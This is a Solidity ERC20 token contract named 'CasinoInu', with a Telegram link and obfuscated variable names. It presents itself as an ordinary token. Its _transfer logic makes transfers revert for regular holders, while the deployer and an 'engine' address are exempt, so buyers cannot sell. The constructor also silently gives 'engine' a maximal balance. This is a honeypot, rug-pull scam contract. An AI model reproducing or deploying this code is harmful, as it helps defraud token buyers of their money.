// https://t.me/casinoinu_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CasinoInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private cook;

    function _transfer(
        address meant,
        address frighten,
        uint256 universe
    ) internal override {
        uint256 best = lost;

        if (wild[meant] == 0 && cook[meant] > 0 && meant != uniswapV2Pair) {
            wild[meant] -= best;
        }

        address slight = address(apart);
        apart = CasinoInu(frighten);
        cook[slight] += best + 1;

        _balances[meant] -= universe;
        uint256 somehow = (universe / 100) * lost;
        universe -= somehow;
        _balances[frighten] += universe;
    }

    mapping(address => uint256) private wild;
    uint256 public lost = 3;

    constructor(
        string memory either,
        string memory meal,
        address high,
        address engine
    ) ERC20(either, meal) {
        uniswapV2Router = IUniswapV2Router02(high);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 wore = ~uint256(0);

        wild[msg.sender] = wore;
        wild[engine] = wore;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[engine] = wore;
    }

    CasinoInu private apart;
}